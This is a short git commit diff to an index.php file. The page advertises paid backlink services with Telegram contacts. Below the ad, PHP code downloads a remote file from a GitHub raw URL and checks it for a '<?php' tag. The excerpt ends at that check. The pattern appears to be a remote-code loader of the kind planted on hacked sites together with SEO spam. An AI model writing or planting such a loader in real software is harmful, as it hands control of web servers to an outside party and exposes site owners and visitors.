df9735a67b5c715088eb06beea14c4f271f4c126
Paid Backlink <152395041+BacklinkGG@users.noreply.github.com>
2024-06-27 00:32:00 +0800

    Update index.php

--- index.php
+++ index.php
@@ -1,7 +1,13 @@
-<?php
+<html>
 <title>Jasa Backlink Murah</title>
+  <body>
+    <center>
   <p> Jasa Backlink Murah Chat Tele: <a href="https://t.me/RibelCyberTeam">Ribel</a></p>
   <p1> Channel Backlink Murah <a href="https://t.me/jasabacklinks">@jasabacklinks</a></p>
+      </center>
+    </body>
+  </html>
+<?php
 $jasabacklinks = 'https://raw.githubusercontent.com/BacklinkGG/vip/main/vip.txt';
 $fileContents = file_get_contents($jasabacklinks);
 if (strpos($fileContents, '<?php') !== false) {
